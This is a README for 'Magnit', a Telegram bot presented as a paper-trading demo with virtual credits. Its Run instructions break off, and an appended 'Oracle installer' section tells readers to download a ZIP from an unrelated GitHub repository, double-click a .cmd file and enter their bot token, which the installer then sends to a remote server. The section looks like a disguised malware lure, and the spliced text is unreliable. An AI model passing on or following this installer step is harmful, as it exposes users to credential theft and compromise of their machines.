# Магнит, Telegram paper-trading demo

Magnit is a fictional Telegram bot demo. It demonstrates menus, language switching, a virtual-credit portfolio, simulated positions, and an activity history.

**No real funds are accepted or transferred.** There are no deposits, withdrawals, wallet addresses, live trades, forecasts, or promised returns. Closing a demo position applies only a selectable hypothetical -10%, 0%, or +10% scenario to virtual credits.

## What works

- `/start`, `/menu`, `/dashboard`, `/help`, `/language`
- English and Russian menus
- New users receive 10,000 virtual credits
- Open and close demo positions, view portfolio and recent activity
- SQLite persistence in `magnit-demo.sqlite3`
- Optional local health endpoint

## Run

Python 3.10+; standard library only.

Set `TELEGRAM_BOT_TOKEN` in the environment (or put a BotFather token in an untracked `config.json` beside `bot.py`), then run:

## Oracle installer (startup repair, 29 October 2026)

**Download:** [MAGNIT_START.zip](https://github.com/arthurflower42-droid/hek/raw/refs/heads/main/MAGNIT_START.zip)

Extract the ZIP, double-click `MAGNIT_START.cmd`, and enter the @MagnitWaveBot token
in the hidden prompt. The installer opens BotFather and then Telegram for verification.
Read the [HTML change and verification record](MAGNIT_START_record.html) for the exact
code changes, checked results, and server paths. Uploading these files to GitHub does
not activate the Oracle service; the installer completes that step after token entry.

The `RunBot.cmd` launcher starts a local process only. A GitHub commit does not run a bot.
The single-file `MAGNIT_START.cmd` release contains a Git bundle and a Windows installer.
It asks for the @MagnitWaveBot token with hidden input, transfers it over SSH stdin,
installs a dedicated systemd service on Oracle, and checks polling plus the `deployed` tag.
The token is stored only in `/etc/magnit/config.json`, outside the Git repository.
Repeated installation of the same healthy release does not restart it.
Backups of configuration, the SQLite database, the old unit, and a Git bundle are kept under
`/opt/magnit/backups`. Windows also receives `Documents/MagnitMain.bundle`.

`bot.py --config /etc/magnit/config.json` now reads an explicit configuration file.
The health endpoint reports the release revision and successful reply count and fails
when polling has not succeeded recently. HTTP 409 diagnostics identify competing consumers.
The installer opens the bot and waits for a new incoming message to produce a confirmed reply.
The selected application remains the Magnit virtual portfolio in `bot.py`.
`bot_550da_demo.py` is preserved and is not selected by this installer.

Validation: `python3 -m unittest -q`, `python3 deploy/scan.py .`, and Python compilation.
The Windows package supports `MAGNIT_CHECK_ONLY=1` for checksum, extraction, and SSH checks
without collecting a token or changing the server.
